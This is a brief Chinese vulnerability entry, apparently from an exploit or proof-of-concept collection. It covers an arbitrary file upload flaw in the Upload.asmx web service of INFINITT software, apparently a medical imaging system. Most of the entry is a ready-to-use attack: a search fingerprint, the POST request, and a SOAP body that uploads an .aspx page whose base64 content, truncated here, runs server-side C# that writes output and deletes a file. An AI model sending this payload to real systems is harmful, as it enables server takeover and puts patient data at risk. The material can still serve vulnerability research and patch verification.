# 英飞达软件（上海）有限公司Upload.asmx存在任意文件上传漏洞

- **系统**：英飞达软件（上海）有限公司　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"INFINITT"`
- **请求**：`POST /webservices/Upload.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
SOAPAction: "http://tempuri.org/UploadData"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UploadData xmlns="http://tempuri.org/">
<guid>1</guid>
<patientId>1</patientId>
<patientName>1</patientName>
<fileName>DudeSuite.aspx</fileName>
<fileSize>1000</fileSize>
<file>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoInRlc3QxMjMiKTsgU3lzdGVtLklPLkZpbGUuRGVsZXRlKFNlcnZlci5…（脚本共 734 字，完整版见原文）
```
- **预期**：200　|　—